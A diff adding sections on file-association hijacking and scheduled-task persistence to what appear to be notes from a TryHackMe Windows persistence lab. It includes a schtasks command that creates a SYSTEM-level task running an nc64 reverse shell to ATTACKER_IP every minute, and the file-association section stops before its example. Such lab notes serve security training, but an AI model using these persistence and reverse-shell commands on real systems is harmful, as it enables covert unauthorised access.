@@ -332,6 +332,25 @@ powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
 
 Now whenever that executable will be double clicked or executed it will revert back top the listner.
 
+## Hijacking File assosiations.
+
+This is one of the most amazing ways to establing persistence because in this way rather than abusing only one executable
+we can abuse all the executables with a specific file type.
+
+The default operating system file associations are kept inside the registry, where a key is stored for every single file type under HKLM\Software\Classes\. Let's say we want to check which program is used to open .txt files; we can just go and check for the .txt subkey and find which Programmatic ID (ProgID) is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:
+
+## Windows task shedular
+
+The most common way to schedule tasks is using the built-in Windows task scheduler. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use schtasks to interact with the task scheduler
+
+```powershell
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+```
+
+The previous command will create a "THM-TaskBackdoor" task and execute an nc64 reverse shell back to the attacker.
+The /sc and /mo options indicate that the task should be run every single minute.
+The /ru option indicates that the task will run with SYSTEM privileges.
+
 ## RID Hijacking
 
 Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.
